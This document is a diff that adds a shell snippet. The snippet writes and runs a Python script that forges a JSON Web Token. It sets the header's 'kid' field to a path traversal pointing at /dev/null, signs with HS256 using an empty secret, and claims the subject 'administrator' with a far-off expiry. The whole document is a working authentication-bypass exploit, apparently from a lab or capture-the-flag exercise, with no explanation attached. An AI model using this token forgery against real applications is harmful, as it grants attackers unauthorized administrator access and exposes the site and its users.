@@ -1,0 +1,34 @@
+cat << 'EOF' > forge_empty_key.py
+import hmac
+import hashlib
+import base64
+import json
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header = {
+    "kid": "../../../../../../dev/null",
+    "alg": "HS256"
+}
+
+payload = {
+    "iss": "[APPLICATION_NAME]",
+    "sub": "administrator",
+    "exp": 9999999999
+}
+
+header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
+payload_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())
+
+signing_input = f"{header_b64}.{payload_b64}".encode()
+
+secret = b""  # empty bytes
+
+signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
+signature_b64 = b64url(signature)
+
+token = f"{header_b64}.{payload_b64}.{signature_b64}"
+print(token)
+EOF
+python forge_empty_key.py
